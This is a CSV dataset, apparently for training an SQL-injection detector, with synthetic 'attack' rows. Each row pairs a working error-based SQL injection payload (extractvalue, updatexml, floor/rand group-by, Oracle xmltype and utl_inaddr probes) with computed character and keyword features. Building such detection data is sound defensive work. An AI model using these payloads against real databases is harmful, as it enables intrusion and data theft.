id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000048,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R000211,0.34514986580649837,174.21815095302844,27.0,3.609161674401952,47.0,35.0,68.6155579597387,23.602592993289782,0.2701325736958971,0.20116255487992338,0.3932373734401767,0.13546749798400282,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.602592993289782,0.0,0.0,5.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000049,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R000211,0.1848902268121878,170.0,27.652353931182255,3.6715837540892577,47.0,35.0,65.0,23.0,0.27647058823529413,0.20588235294117646,0.38235294117647056,0.13529411764705881,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000050,attack,error,"1'   )    )    as xntz where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000035,0.8852304682338441,331.0846248232392,39.72637497474846,3.9847814136787885,109.27362502525153,63.0,123.35824984849077,35.45274994949692,0.3300898416300566,0.19030074832012314,0.3725448064319766,0.10706460361784358,0.7263749747484612,0.0,2.0,0.0,2.0,2.0,0.0,21.72637497474846,0.0,0.0,6.0,7.0,0.7263749747484612,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,0.27362502525153876,0.7263749747484614,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000051,attack,error,-7746'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'itxy' like 'itxy,nearest_attack_euclidean,R000126,0.09819016012412844,452.41485939957136,36.0,3.449919801556159,115.0,54.0,206.84571616630944,76.56914323326188,0.2542632322941756,0.11939316994683025,0.457097449025575,0.16924614873341917,4.0,0.0,1.0,0.0,0.0,2.0,0.0,43.56914323326188,0.0,0.0,0.0,29.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,8.0
SMOTE_000052,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'aduc'  =  'aduc",nearest_attack_euclidean,R000184,1.3397245951840202,343.24059741225517,37.459900431290805,3.7996546755411806,105.32079654967356,55.0,141.0,41.91980086258161,0.30676445501743654,0.16024963568791198,0.41082179330901075,0.12216411598564073,4.0,0.0,0.0,0.0,2.0,2.0,0.0,26.0,0.9198008625816099,0.0,6.0,4.999999999999999,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000053,attack,error,"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yxpo"" like ""yxpo",nearest_attack_euclidean,R000142,0.00639951263764814,194.95032956178963,30.0,3.554865765108032,50.98509886853689,35.019868175284145,82.95032956178963,25.995032956178964,0.2615281350440311,0.17964276533659798,0.4254868166575312,0.1333422829618397,0.0,4.0,0.0,0.0,0.0,1.0,0.0,15.990065912357926,0.0,0.0,5.004967043821038,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000054,attack,error,"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",nearest_attack_euclidean,R000135,0.05718112768754452,336.610541913468,39.0,3.9161342044875798,109.84421676538722,55.0,132.76632514808082,39.0,0.32631908413870775,0.16340525695044658,0.39440647670962,0.11586918220122576,0.0,4.0,0.0,0.0,2.0,2.0,0.0,23.961054191346804,0.03894580865319763,0.0,6.0,4.999999999999999,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000055,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjfm'  =  'kjfm",nearest_attack_euclidean,R000296,0.058122637337899116,160.0,29.87859993617863,3.8574178983307927,46.81789990426795,35.24280012764274,56.87859993617863,21.060700031910685,0.2926118744016747,0.2202675007977671,0.35549124960111644,0.1316293751994418,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,5.0607000319106845,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000056,attack,error,"-4135""  )   as leiz where 3582  =  3582 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",nearest_attack_euclidean,R000234,0.4988321151130941,424.7993032294494,35.476491081486785,3.5220335682524033,106.23508918513217,61.523508918513215,186.6614060739813,70.3792990518227,0.24985836280069307,0.14541841070950418,0.4390266816757134,0.16569654481408938,0.0,1.0,3.0,0.0,0.0,3.0,0.0,38.09403567405287,0.0,0.0,0.23824554074339188,30.57052675553965,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.7617544592566083,0.0,1.0,1.7617544592566081,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,7.523508918513216
SMOTE_000057,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000033,0.04864317718712198,192.65964860138882,29.0,3.6167555187976212,55.0,32.0,79.52771888111106,26.13192972027776,0.28552287868511794,0.16612240214406862,0.41272715000163995,0.1356275691691734,4.0,0.0,0.0,0.0,1.0,2.0,0.0,14.131929720277762,0.0,0.0,4.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,7.0
SMOTE_000058,attack,error,"-7686%""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000014,1.2197630335576708,203.85427919743205,39.550611313918864,3.891645199045947,63.0,37.0,81.20244525567546,22.651833941756593,0.3091347925256469,0.18155535434045927,0.3982850481772454,0.11102480495664843,0.0,0.550611313918864,1.0,0.0,1.0,1.0,0.0,14.550611313918864,0.550611313918864,0.0,3.0,3.0,0.0,0.5506113139188641,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000059,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000286,1.171145615408845,186.70206647244177,27.61859505453488,3.4540899662530875,44.855785163604644,36.948760436279045,81.66033076348833,23.23719010906976,0.24091653088975196,0.19739692884590326,0.436966419149142,0.12472012111520277,0.0,0.3814049454651196,0.0,0.0,1.0,1.6185950545348804,0.0,15.237190109069761,0.0,0.0,4.0,2.6185950545348806,0.0,0.38140494546511955,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.6185950545348804,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,6.618595054534881
SMOTE_000060,attack,error,select   (  case when   (  9667  =  6212  )   then 9667 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000073,0.0008691438200845768,133.0,28.0,3.723046579996236,56.0,14.0,51.00000000000001,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0000000000000002,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,7.0
SMOTE_000061,attack,error,-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000108,0.27623325705804774,363.3231309111526,35.70408192549751,3.550383277657137,91.0986393581675,47.70408192549751,158.81632770199005,65.70408192549752,0.25079986185495395,0.13129018752221122,0.4370670655443391,0.1808428850784957,4.0,0.0,0.901360641832504,0.0,0.0,3.0,0.0,31.802721283665008,2.0,3.0,0.0,23.901360641832504,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.098639358167496,0.901360641832504,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000062,attack,error,"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""igop""  =  ""igop",nearest_attack_euclidean,R000043,0.03947142575037054,170.4754237768489,27.98019067596463,3.7623908740371244,44.0,39.0,63.39618648070743,24.079237296141482,0.25818924662882503,0.22884955951191305,0.3717222560272523,0.14123893783200966,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.079237296141484,0.0,0.0,6.0,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000063,attack,error,"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000275,0.025659152577990358,143.9560224978523,25.010994375536917,3.6248924870459462,34.0,39.0,52.95602249785234,18.0,0.23618527951751095,0.27091840885832136,0.3678570459972501,0.12503926562691756,0.0,0.010994375536917733,0.0,0.0,0.0,1.0,0.0,10.989005624463083,0.0,0.0,6.0,1.0,0.0,0.010994375536917789,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,3.0000000000000004
SMOTE_000064,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000104,0.021409418090783713,161.94061351680415,32.99010225280069,3.667740849336716,50.0,23.0,67.96040901120276,20.980204505601385,0.30875946993351505,0.14202935616941692,0.4196590907198546,0.1295520831772134,0.9901022528006915,0.0,0.0,0.0,0.0,0.0,0.0,14.990102252800693,0.0,0.0,4.0,0.0,0.9901022528006914,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,2.0
SMOTE_000065,attack,error,"1%""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000196,0.275619656141889,325.85124423393677,39.0,3.900372181315739,102.0,55.0,128.58678077194577,40.264463461990964,0.31316222791215276,0.1688619856389059,0.39441715623624485,0.12355863021269647,0.0,4.0,0.0,0.0,2.0,2.0,0.0,23.264463461990964,2.0,0.0,6.0,4.999999999999999,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000066,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000173,0.4101630602754095,226.42977721187378,34.42883938041639,3.8147962238795787,65.85767876083278,39.23845250722186,89.7144196902082,31.61922625361093,0.2906440694157803,0.17312496294000723,0.3965999861643183,0.1396309814798941,4.0,0.0,0.0,0.0,1.0,2.0,0.0,16.0,0.0,0.0,4.0,6.619226253610929,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.9048065634027322,3.9048065634027327,0.0,0.9048065634027322,1.9048065634027322,1.0951934365972678,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,8.809613126805464
SMOTE_000067,attack,error,1%'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000189,0.8695004988497345,434.91929009349633,34.0,3.387416883699734,103.67481580946762,51.975552571597134,201.89484266509345,77.37407904733811,0.23861307531612375,0.11975377028492867,0.46370968233316434,0.17792347206578327,4.0,0.0,0.3251841905323768,0.0,0.0,3.0,0.0,42.04889485680574,2.0,0.0,0.0,29.325184190532376,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,1.674815809467623,0.3251841905323768,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,8.0
SMOTE_000068,attack,error,"-2852%'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000302,0.400797999913087,205.52941577863646,40.264707889318245,3.896240416647035,63.0,37.0,82.01961051909099,23.509805259545494,0.30657453808123397,0.18005171284135962,0.3990222286592402,0.11435152041816622,1.0,0.0,1.0,0.0,1.0,1.0,0.0,14.754902629772747,0.7549026297727475,0.0,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000069,attack,error,1  )   where 6116  =  6116 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000278,0.701206694667063,351.6287860750677,32.87626202502257,3.614843236401119,95.75252405004514,53.0,144.58417468334838,58.29208734167419,0.2722585279762561,0.15074734147061367,0.41120945534471065,0.16578467520841964,0.0,0.2920873416741889,2.0,0.0,0.0,3.0,0.0,29.0,0.0,3.0,0.0,25.0,0.0,0.29208734167418876,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000070,attack,error,"1""  )   where 5196  =  5196 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000264,1.041753672544017,361.2612386760828,34.105537331988174,3.5386306886272028,88.68338800403548,57.0,155.5778506720473,60.0,0.2454149869482765,0.15783892053485463,0.4305998603749167,0.16614623214195223,0.0,0.5527686659940858,2.0,0.0,0.0,3.0,0.0,31.447231334005913,0.0,0.0,1.0,25.0,0.0,0.5527686659940858,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000071,attack,error,"1'+  (  select zpns where 6922  =  6922 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000128,1.236413884224276,290.5002416747174,37.6600096669887,4.0373185631967665,111.66000966698869,40.28007733590957,103.58012567085304,34.980029000966084,0.38496101143545725,0.13834720029568284,0.3562780005702168,0.1204137876986431,2.679980666022609,0.0,0.0,0.0,2.0,1.6600096669886955,0.0,19.320019333977392,0.0,2.0,5.0,4.980029000966087,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.660009666988696,0.0,0.6600096669886955,2.0,1.0,0.3399903330113046,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.660009666988696
SMOTE_000072,attack,error,select   (  case when   (  4415  =  2051  )   then 4415 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000172,0.05333393161077742,133.0,27.213813199271627,3.7043982480107727,56.0,14.0,51.00000000000001,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0000000000000002,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,7.0
